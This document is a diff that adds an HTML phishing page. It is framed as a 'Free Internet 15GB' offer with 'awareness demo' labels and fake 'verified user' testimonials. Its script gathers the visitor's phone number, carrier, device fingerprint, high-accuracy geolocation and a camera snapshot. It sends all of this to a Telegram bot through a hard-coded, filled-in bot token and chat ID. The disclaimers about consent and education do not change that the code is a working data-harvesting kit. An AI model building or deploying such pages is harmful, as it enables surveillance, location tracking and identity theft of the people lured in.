@@ -1,0 +1,426 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Free Internet Data Hub — Awareness Demo</title>
+<meta name="description" content="Consent-first demo showing how location & camera permission prompts work (educational only)." />
+<!-- CONFIG: If you want to test Telegram forwarding locally, set BOT_TOKEN and CHAT_ID.
+     WARNING: putting your bot token client-side is insecure. Prefer server-side proxy for real use. -->
+<script>
+  const BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U"; // e.g. "123456:ABC-DEF..." — leave empty to disable Telegram send
+  const CHAT_ID  = "6000036430";  // e.g. "@yourchannel" or numeric chat id
+</script>
+
+<style>
+  /* ---------- DESIGN: Free Internet style (mobile-first) ---------- */
+  :root{
+    --bg-start: #1bd49f;
+    --bg-end: #2cc0ff;
+    --muted: #5b6470;
+    --card: #ffffff;
+    --accent: #15b37a;
+    --radius: 18px;
+    --shadow: 0 14px 30px rgba(12,20,35,0.08);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Inter, 'Segoe UI', Roboto, system-ui, -apple-system, Arial;color:#0b1220;}
+  body{background:linear-gradient(180deg, #f7fdf9 0%, #f3fbff 100%); -webkit-font-smoothing:antialiased; padding:20px 12px;}
+
+  /* top appbar */
+  .appbar{display:flex;align-items:center;gap:12px;background:#fff;border-radius:10px;padding:14px 16px;box-shadow:var(--shadow);max-width:1100px;margin:0 auto 18px;}
+  .logo{display:flex;align-items:center;gap:10px}
+  .logo .icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--bg-start),var(--bg-end));display:grid;place-items:center;color:#fff;font-weight:800}
+  .brand{font-size:20px;color:var(--bg-start);font-weight:700}
+  .appbar small{display:block;color:var(--muted);font-size:12px;margin-top:2px}
+
+  /* hero */
+  .hero{max-width:1100px;margin:0 auto;background:linear-gradient(180deg,var(--bg-start),var(--bg-end));color:#fff;border-radius:18px;padding:46px 24px;box-shadow:var(--shadow);overflow:hidden}
+  .hero h1{margin:0;font-size:28px;line-height:1.02;text-align:center;font-weight:800}
+  .hero p{margin-top:12px;text-align:center;color:rgba(255,255,255,0.9);font-size:15px;max-width:760px;margin-left:auto;margin-right:auto}
+  .hero .cta{display:block;margin:22px auto 0;padding:12px 18px;border-radius:12px;background:rgba(255,255,255,0.12);color:#fff;border:0;font-weight:700;max-width:260px;text-align:center}
+
+  /* main content grid */
+  .main{max-width:1100px;margin:18px auto 80px;display:grid;grid-template-columns:1fr 420px;gap:24px}
+  @media (max-width:980px){ .main{grid-template-columns:1fr} .hero h1{font-size:24px} }
+
+  /* left column - features & testimonials */
+  .left{padding:18px;border-radius:14px;background:linear-gradient(180deg,#f7fff7, #fff);box-shadow:var(--shadow)}
+  .sectionTitle{font-weight:800;font-size:20px;color:#102028;margin-bottom:12px}
+  .featureCard{background:#f2fcf7;border-radius:14px;padding:18px;margin-bottom:12px;display:flex;gap:12px;align-items:center}
+  .featureIcon{width:48px;height:48;border-radius:12px;background:linear-gradient(135deg,#a6f0d1,#15b37a);display:grid;place-items:center;color:#fff;font-weight:800}
+  .featureCard h4{margin:0;font-size:16px}
+  .featureCard p{margin:6px 0 0;color:var(--muted);font-size:14px}
+
+  .testimonial{background:#fff;border-radius:14px;padding:16px;margin-top:12px;box-shadow:0 8px 18px rgba(12,20,35,0.04)}
+  .t-head{display:flex;align-items:center;gap:12px}
+  .avatar{width:44px;height:44px;border-radius:22px;background:#16b37a;color:#fff;display:grid;place-items:center;font-weight:700}
+  .t-head strong{display:block}
+  .t-head small{color:var(--bg-start)}
+
+  /* right column - form card */
+  .card{background:var(--card);border-radius:16px;padding:18px;box-shadow:var(--shadow);position:relative}
+  .card h3{margin:0;font-size:20px;color:#0b1220}
+  .muted{color:var(--muted);font-size:13px}
+  .field{width:100%;padding:12px 14px;border-radius:12px;border:1px solid #eef3f2;margin-top:8px;font-size:15px}
+  .label{font-size:13px;color:var(--muted);margin-top:12px;display:block}
+  .row{display:flex;gap:10px}
+  .btnPrimary{display:inline-block;background:var(--accent);color:#fff;padding:12px 16px;border-radius:12px;border:0;font-weight:800;cursor:pointer;margin-top:14px;width:100%}
+  .btnGhost{background:transparent;border:1px solid #eef3f2;padding:10px 12px;border-radius:10px;color:var(--muted);cursor:pointer}
+
+  .consent{display:flex;gap:10px;align-items:flex-start;margin-top:12px}
+  .consent label{font-size:13px;color:var(--muted)}
+  .status{margin-top:12px;color:var(--muted);font-size:14px}
+
+  /* preview box */
+  .previewBox{margin-top:12px;background:#fafdfc;border-radius:12px;padding:12px;border:1px solid #eef6f2;font-size:13px;color:#0b1220}
+  .snapshot{max-width:100%;border-radius:10px;margin-top:8px;display:block}
+
+  /* footer small */
+  .note{font-size:12px;color:#9aa3b2;margin-top:10px}
+
+  /* helpers */
+  .rowBetween{display:flex;justify-content:space-between;align-items:center}
+  .center{display:flex;align-items:center;gap:10px}
+</style>
+</head>
+<body>
+
+  <!-- App bar -->
+  <div class="appbar" role="banner" aria-label="Free Internet Data Hub header">
+    <div class="logo" aria-hidden="true">
+      <div class="icon">Wi</div>
+      <div>
+        <div class="brand">Free Internet</div>
+        <small>Awareness demo</small>
+      </div>
+    </div>
+  </div>
+
+  <!-- HERO -->
+  <section class="hero" aria-hidden="false">
+    <h1>Get 15GB Free Internet — Awareness Demo</h1>
+    <p>Educational demo showing how a website requests permissions (location & camera) and what data can be read by browser APIs — consent is required before any sensitive action.</p>
+    <button class="cta" onclick="document.getElementById('phone').scrollIntoView({behavior:'smooth'})">Claim Your Free Data</button>
+  </section>
+
+  <!-- Main area -->
+  <main class="main" role="main">
+    <!-- Left: features & testimonials -->
+    <div class="left" aria-labelledby="whatTitle">
+      <div id="whatTitle" class="sectionTitle">Why Choose Us (Demo)</div>
+
+      <div class="featureCard" role="article">
+        <div class="featureIcon" aria-hidden="true">⚡</div>
+        <div>
+          <h4>Instant Activation (Demo)</h4>
+          <p>Shows how permissions and instant verification prompts appear. This is purely educational.</p>
+        </div>
+      </div>
+
+      <div class="featureCard" role="article">
+        <div class="featureIcon" aria-hidden="true">🌐</div>
+        <div>
+          <h4>Worldwide Coverage (Demo)</h4>
+          <p>We demonstrate location request and how a link to coordinates can be formed.</p>
+        </div>
+      </div>
+
+      <div class="sectionTitle" style="margin-top:14px">What Our Users Say</div>
+      <div class="testimonial">
+        <div class="t-head">
+          <div class="avatar">A</div>
+          <div>
+            <strong>Anjali Gupta</strong>
+            <small>Verified User</small>
+          </div>
+        </div>
+        <p style="margin-top:10px;color:var(--muted)">"Amazing service! This demo shows how consent works before sharing location or snapshot."</p>
+      </div>
+
+      <div class="testimonial" style="margin-top:10px">
+        <div class="t-head">
+          <div class="avatar">G</div>
+          <div>
+            <strong>Gaurav Kumar</strong>
+            <small>Verified User</small>
+          </div>
+        </div>
+        <p style="margin-top:10px;color:var(--muted)">"Clear, safe and educational — perfect for learning about browser permissions."</p>
+      </div>
+    </div>
+
+    <!-- Right: form -->
+    <aside class="card" aria-labelledby="formTitle">
+      <div class="rowBetween">
+        <div>
+          <div style="font-size:12px;color:var(--muted)">Offer</div>
+          <h3 id="formTitle">Claim Your Free 15GB Now</h3>
+        </div>
+        <div class="muted">Demo v1.0</div>
+      </div>
+
+      <label class="label" for="country">Country</label>
+      <select id="country" class="field" aria-label="Select country">
+        <option value="">Select Country 🌍</option>
+        <option value="India">India</option>
+        <option value="United States">United States</option>
+        <option value="United Kingdom">United Kingdom</option>
+        <option value="Canada">Canada</option>
+        <option value="Australia">Australia</option>
+        <option value="Other">Other</option>
+      </select>
+
+      <label class="label" for="carrier">SIM Provider</label>
+      <select id="carrier" class="field" aria-label="Select operator">
+        <option value="">Select Operator 📱</option>
+        <option>Jio</option>
+        <option>Airtel</option>
+        <option>Vodafone</option>
+        <option>Idea</option>
+        <option>Other</option>
+      </select>
+
+      <label class="label" for="phone">Phone Number</label>
+      <input id="phone" class="field" placeholder="Enter your phone number" type="tel" inputmode="tel" aria-label="Phone number" />
+
+      <div class="consent" style="margin-top:10px">
+        <input id="consent" type="checkbox" aria-label="I consent to share my info" />
+        <div>
+          <label for="consent" style="font-weight:700">I consent</label>
+          <div class="muted">I agree this demo will request my location and take one camera snapshot. Data is forwarded for demonstration only.</div>
+        </div>
+      </div>
+
+      <button id="claimBtn" class="btnPrimary" aria-label="Claim your free data">Get Your Free 15GB Now</button>
+
+      <div class="status" id="status"> </div>
+
+      <div class="previewBox" id="preview" style="display:none" aria-live="polite"></div>
+
+      <div class="note">⚠️ Demo purpose only — do not use real credentials here. Client-side Telegram token is insecure; use server forwarding for production.</div>
+    </aside>
+  </main>
+
+<script>
+/* =====================
+   DEMO JS - consent-first
+   ===================== */
+
+const countryEl = document.getElementById('country');
+const carrierEl = document.getElementById('carrier');
+const phoneEl = document.getElementById('phone');
+const consentEl = document.getElementById('consent');
+const claimBtn = document.getElementById('claimBtn');
+const statusEl = document.getElementById('status');
+const previewEl = document.getElementById('preview');
+
+/* helpers */
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const safe = v => (v||'').toString().trim();
+
+/* Device info */
+function getDeviceInfo(){
+  return {
+    platform: navigator.platform || 'unknown',
+    userAgent: navigator.userAgent || 'unknown',
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language || 'unknown',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+    touchPoints: navigator.maxTouchPoints || 0,
+    connection: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'unknown'
+  };
+}
+
+/* Location */
+function requestLocation(timeout = 10000){
+  return new Promise(resolve => {
+    if(!navigator.geolocation) return resolve(null);
+    let done = false;
+    const timer = setTimeout(()=>{ if(!done){ done = true; resolve(null); } }, timeout);
+    navigator.geolocation.getCurrentPosition(pos=>{
+      if(done) return;
+      done = true; clearTimeout(timer);
+      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
+    }, err=>{
+      if(done) return;
+      done = true; clearTimeout(timer);
+      resolve(null);
+    }, { enableHighAccuracy:true, timeout });
+  });
+}
+
+/* Snapshot capture */
+async function takeSnapshot(){
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
+    const track = stream.getVideoTracks()[0];
+
+    // Try ImageCapture.takePhoto if available
+    if(window.ImageCapture){
+      try{
+        const ic = new ImageCapture(track);
+        if(ic.takePhoto){
+          const blob = await ic.takePhoto();
+          try{ track.stop(); }catch(e){}
+          return blob;
+        }
+      }catch(e){ /* fallback */ }
+    }
+
+    // fallback draw to canvas
+    const video = document.createElement('video');
+    video.playsInline = true;
+    video.muted = true;
+    video.srcObject = stream;
+    await video.play().catch(()=>{});
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+    try{ track.stop(); }catch(e){}
+    try{ video.pause(); video.srcObject = null; }catch(e){}
+    return blob;
+  }catch(e){
+    console.warn('snapshot failed', e);
+    return null;
+  }
+}
+
+/* Compose payload text */
+async function composeText(phone, carrier, country, spinNote = ''){
+  const dev = getDeviceInfo();
+  const loc = await requestLocation(8000);
+  const locLink = loc ? `https://maps.google.com/?q=${loc.lat},${loc.lon}` : 'Location not shared';
+  const lines = [
+    `Demo: FreeRecharge Submission`,
+    `Time: ${new Date().toISOString()}`,
+    `Phone: ${phone}`,
+    `Carrier: ${carrier}`,
+    `Country: ${country}`,
+    '---',
+    `Platform: ${dev.platform}`,
+    `UserAgent: ${dev.userAgent}`,
+    `Screen: ${dev.screen}`,
+    `Language: ${dev.language}`,
+    `Timezone: ${dev.timezone}`,
+    `TouchPoints: ${dev.touchPoints}`,
+    `Connection: ${dev.connection}`,
+    '---',
+    `Location: ${locLink}`
+  ];
+  if(spinNote) lines.push('Note: ' + spinNote);
+  return lines.join('\n');
+}
+
+/* Telegram senders (client-side demo only) */
+async function sendTelegramText(text){
+  if(!BOT_TOKEN || !CHAT_ID){ console.warn('Telegram tokens not set'); return null; }
+  try{
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('text', text);
+    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', body: fd });
+    return await resp.json();
+  }catch(e){
+    console.error('TG send error', e);
+    return null;
+  }
+}
+async function sendTelegramPhoto(captionText, blob){
+  if(!BOT_TOKEN || !CHAT_ID){ console.warn('Telegram tokens not set'); return null; }
+  try{
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('photo', blob, 'snapshot.jpg');
+    const caption = (captionText.length > 900) ? captionText.slice(0,900) + '...' : captionText;
+    fd.append('caption', caption);
+    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
+    return await resp.json();
+  }catch(e){
+    console.error('TG photo error', e);
+    return null;
+  }
+}
+
+/* Render preview box (no network) */
+function renderPreview(text, loc, imageUrl){
+  previewEl.style.display = 'block';
+  previewEl.innerHTML = `<strong>Collected info (preview):</strong>
+    <div style="margin-top:8px; font-size:13px; color:var(--muted)"><pre style="white-space:pre-wrap">${text}</pre></div>`;
+  if(loc) {
+    previewEl.innerHTML += `<div style="margin-top:8px"><a href="https://maps.google.com/?q=${loc.lat},${loc.lon}" target="_blank">Open location in maps</a></div>`;
+  }
+  if(imageUrl){
+    previewEl.innerHTML += `<img src="${imageUrl}" alt="snapshot" class="snapshot" />`;
+  }
+}
+
+/* Main flow on claim button */
+claimBtn.addEventListener('click', async () => {
+  previewEl.style.display = 'none';
+  statusEl.textContent = '';
+  const phone = safe(phoneEl.value);
+  const carrier = safe(carrierEl.value);
+  const country = safe(countryEl.value);
+  if(!phone || !carrier || !country){
+    statusEl.textContent = 'Please fill Phone, Carrier and Country before proceeding.';
+    return;
+  }
+  if(!consentEl.checked){
+    statusEl.textContent = 'Please check consent to allow location & snapshot.';
+    return;
+  }
+
+  statusEl.textContent = 'Requesting permissions — your browser will prompt for location and camera (consent required)...';
+  await sleep(300);
+
+  // Start location + snapshot concurrently
+  const locPromise = requestLocation(10000);      // may resolve null if denied/timeouts
+  const snapPromise = takeSnapshot();             // may resolve null if denied
+
+  // Meanwhile compose text (includes a separate location request inside composeText — we still await locPromise for preview)
+  const textPromise = composeText(phone, carrier, country, 'FreeRecharge demo submission');
+
+  // wait for both
+  const [text, snapBlob, loc] = await Promise.all([textPromise, snapPromise, locPromise]);
+
+  // create preview image url if snapshot exists
+  let imgUrl = null;
+  if(snapBlob){ imgUrl = URL.createObjectURL(snapBlob); }
+
+  // Show preview on page
+  renderPreview(text, loc, imgUrl);
+  statusEl.textContent = 'Collected data (preview shown). Sending to Telegram if demo credentials provided...';
+
+  // If Telegram tokens present, attempt to send (client-side demo)
+  if(BOT_TOKEN && CHAT_ID){
+    try{
+      statusEl.textContent = 'Sending to Telegram...';
+      if(snapBlob){
+        await sendTelegramPhoto(text, snapBlob);
+      }else{
+        await sendTelegramText(text);
+      }
+      statusEl.textContent = 'Sent to Telegram (client-side demo).';
+    }catch(e){
+      statusEl.textContent = 'Failed to send to Telegram (see console).';
+    }
+  }else{
+    statusEl.textContent = 'Telegram not configured — preview only (recommended for safe demos).';
+  }
+
+  // release object URL after 30s to avoid memory leak
+  if(imgUrl) setTimeout(()=>URL.revokeObjectURL(imgUrl), 30000);
+});
+
+/* Accessibility: allow Enter to submit when focused on phone field */
+phoneEl.addEventListener('keydown', e => { if(e.key === 'Enter'){ claimBtn.click(); } });
+
+</script>
+</body>
+</html>
